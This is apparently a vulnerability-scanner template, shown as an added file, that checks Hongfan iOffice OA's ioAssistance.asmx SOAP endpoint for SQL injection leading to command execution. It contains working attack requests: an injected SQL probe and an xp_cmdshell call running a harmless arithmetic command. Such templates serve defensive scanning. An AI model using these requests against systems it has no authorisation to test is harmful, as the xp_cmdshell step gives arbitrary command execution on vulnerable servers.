@@ -1,0 +1,69 @@
+id: poc-yaml-ioffice-ioassistance-rce
+info:
+  name: 红帆OA ioAssistance.asmx Remote Command Execution Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: rce, ioffice
+  metadata:
+    product: 红帆OA ioAssistance
+
+variables:
+  t1: "{{rand_int(111000, 999000)}}"
+  t2: "{{rand_int(10, 100)}}"
+  t3: "{{to_number(t1) - to_number(t2)}}"
+  command: "cmd.exe /c set /a {{t1}} - {{t2}}"
+
+http:
+  - raw:
+      - |
+        POST /ioffice/prg/set/wss/ioAssistance.asmx HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: text/xml; charset=utf-8
+
+        <?xml version="1.0" encoding="utf-8"?>
+        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+        <soap:Body>
+        <GetLoginedEmpNoReadedInf xmlns="http://tempuri.org/">
+        <sql>(SELECT CHAR(113)+CHAR(120)+CHAR(122)+CHAR(112)+CHAR(113)+CHAR(113)+CHAR(120)+CHAR(122)+CHAR(112)+CHAR(113)+CHAR(113)+CHAR(120)+CHAR(122)+CHAR(112)+CHAR(113)+CHAR(113)+CHAR(120)+CHAR(122)+CHAR(112)+CHAR(113))</sql>
+        </GetLoginedEmpNoReadedInf>
+        </soap:Body>
+        </soap:Envelope>
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "qxzpqqxzpqqxzpqqxzpq"
+
+  - raw:
+      - |
+        POST /ioffice/prg/set/wss/ioAssistance.asmx HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: text/xml; charset=utf-8
+
+        <?xml version="1.0" encoding="utf-8"?>
+        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+        <soap:Body>
+        <GetLoginedEmpNoReadedInf xmlns="http://tempuri.org/">
+        <sql>exec master.dbo.xp_cmdshell '{{command}}'</sql>
+        </GetLoginedEmpNoReadedInf>
+        </soap:Body>
+        </soap:Envelope>
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: dsl
+        dsl:
+          - contains(body, t3)
+          - contains(body, "<Table1 diffgr:id=")
+
+    extractors:
+      - type: regex
+        part: body
+        regex:
+          - "<Table1 diffgr:id=\"(.*?)\""
